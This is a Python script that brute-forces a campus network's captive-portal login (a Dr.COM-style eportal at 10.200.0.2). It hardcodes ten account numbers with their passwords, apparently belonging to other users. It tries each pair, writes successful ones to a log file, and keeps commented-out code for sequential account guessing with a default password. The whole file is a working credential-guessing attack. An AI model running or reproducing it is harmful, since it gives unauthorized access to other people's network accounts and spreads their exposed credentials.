# -*- coding = UTF-8 -*-
# @Time : 2021/10/24 上午10:46
# @Author : XIADENGMA
# @File : auto_2.py
# @Software : PyCharm
# @achieve : get请求 爆破
# @version : 1.1.0

import socket
import requests
import os
import time

i = 0
test_account = "200100000"

# 获取局域网ip
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 80))
    ip = s.getsockname()[0]
    s.close()
    print("本机ip：" + ip)
except:
    print("获取局域网ip失败:请检查Wi-Fi是否连接正确")
    exit()

while True:
    # test_account = str(int(test_account) + 1)
    # test_password = "111111"

    # 校园网请求地址&帐号&密码
    url = "http://10.200.0.2:801/eportal/"
    account_tuple = (
        "201401123", "201201015", "201000935", "200700822", "200700808", "200500707", "200400578",
        "200200440", "200100399", "200700851")
    password_tuple = (
        "890203", "222117", "107119", "310024", "111111", "172825", "2706x", "240419", "111111", "080541")

    # 正常连接
    final_account = account_tuple[i]
    final_password = password_tuple[i]

    # 校园网爆破
    # final_account = test_account
    # final_password = test_password

    # 请求标头
    headers = {
        'Connection': 'keep-alive',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.81',
        'DNT': '1',
        'Accept': '*/*',
        'Referer': 'http://10.200.0.2/',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    }

    # 参数
    params = (
        ('c', 'Portal'),
        ('a', 'login'),
        ('callback', 'dr1003'),
        ('login_method', '1'),
        ('user_account', final_account),
        ('user_password', final_password),
        ('wlan_user_ip', ip),
        ('wlan_user_ipv6', ''),
        ('wlan_user_mac', '000000000000'),
        ('wlan_ac_ip', ''),
        ('wlan_ac_name', ''),
        ('jsVersion', '3.3.1'),
        ('_', '000000000000'),
    )
    try:
        # 连接校园网
        response = requests.get(url, headers=headers, params=params, verify=False, timeout=1)

        # 校园网登录状态判断
        if r'\u8ba4\u8bc1\u6210\u529f' in response.text:
            print("登录成功")
            print("当前帐号:{0}\n当前密码:{1}\n".format(final_account, final_password))

            t = time.localtime()
            file = open("/home/xiadengma/code/个人项目/python/auto-ncist-teacher/successLog.txt", "a+", encoding='utf-8')
            file.write("{0}年{1}月{2}日{3}时{4}分{5}秒:  帐号:{6}  密码:{7}\n".format(t.tm_year, t.tm_mon, t.tm_mday, t.tm_hour,
                                                                            t.tm_min, t.tm_sec, final_account,
                                                                            final_password))
            file.close()

            # break
        else:
            print("连接校园网失败 当前帐号:{0} 当前密码:{1}".format(final_account, final_password))
    except:
        print("连接校园网错误")

    # 测试是否可以正常上网
    exit_code = os.system('ping www.baidu.com -n -q -c 1 -W 1 >/dev/null 2>&1')

    # 正常上网状态判断
    if exit_code == 0:
        print("网络可正常使用")

        break
    else:
        print("网络不可使用")

    i = i + 1

    # 正常连接校园网,测试完所有帐号密码后退出
    if i == len(account_tuple):
        break
